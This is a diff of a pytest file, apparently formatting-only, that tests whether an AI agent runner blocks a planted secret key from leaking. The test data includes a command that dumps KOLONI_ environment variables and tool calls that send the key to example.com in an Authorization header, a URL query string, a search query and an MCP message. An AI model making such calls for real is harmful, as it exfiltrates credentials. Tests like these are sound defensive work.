@@ -51,8 +51,10 @@ def test_a_command_that_names_the_key_is_refused_unrun_and_the_turn_stops(
 def test_its_commands_have_the_key_and_their_output_hides_it_with_no_stop(
     make_client, wait_run, project_dir
 ):
-    prints = py("import os; print([(k, v) for k, v in os.environ.items() "
-                "if k.startswith('KOLONI_')])", project_dir)
+    prints = py(
+        "import os; print([(k, v) for k, v in os.environ.items() if k.startswith('KOLONI_')])",
+        project_dir,
+    )
     client, model = make_client([cmd(prints), text("read it")])
     cid, run_id = start_in_mode(client, project_dir, "full_auto")
     snap = wait_run(client, cid, run_id, timeout=20)
@@ -65,19 +67,30 @@ def test_its_commands_have_the_key_and_their_output_hides_it_with_no_stop(
 
 def leaks(client, name, args_of):
     """A step that hands a tool the turn's key, as one that found it somewhere would."""
+
     async def go(_on_delta):
         (key,) = client.app.state.runner._canaries.values()
         return step(call(name, args_of(key)))
+
     return go
 
 
-@pytest.mark.parametrize("name,args_of", [
-    ("http_request", lambda key: {"method": "GET", "url": "https://example.com",
-                                  "headers": {"Authorization": f"Bearer {key}"}}),
-    ("web_search", lambda key: {"query": key}),
-    ("browser_open", lambda key: {"url": f"https://example.com/?k={key}"}),
-    ("theirs__send", lambda key: {"text": key}),  # an MCP tool's, by its name
-])
+@pytest.mark.parametrize(
+    "name,args_of",
+    [
+        (
+            "http_request",
+            lambda key: {
+                "method": "GET",
+                "url": "https://example.com",
+                "headers": {"Authorization": f"Bearer {key}"},
+            },
+        ),
+        ("web_search", lambda key: {"query": key}),
+        ("browser_open", lambda key: {"url": f"https://example.com/?k={key}"}),
+        ("theirs__send", lambda key: {"text": key}),  # an MCP tool's, by its name
+    ],
+)
 def test_a_web_browser_or_mcp_call_carrying_the_key_is_refused_and_the_turn_stops(
     make_client, wait_run, project_dir, name, args_of
 ):
@@ -100,10 +113,13 @@ def test_off_nothing_is_planted_and_nothing_is_stopped(make_client, wait_run, pr
 
 
 def test_a_cli_with_its_own_tools_has_the_key_and_its_hook_stops_a_command_that_sends_it(
-    claude_app, wait_run, project_dir  # noqa: F811
+    claude_app,
+    wait_run,
+    project_dir,  # noqa: F811
 ):
-    client, provider, _ = claude_app([
-        {"tool": "Bash", "input": {"command": SENDS}, "result": "sent"}, {"say": "done"}])
+    client, provider, _ = claude_app(
+        [{"tool": "Bash", "input": {"command": SENDS}, "result": "sent"}, {"say": "done"}]
+    )
     cid, run_id = start(client, project_dir, provider, "full_auto")
     snap = wait_run(client, cid, run_id, timeout=20)
     assert ("run_command", "denied", CANARY_REFUSED) in stopped(snap)
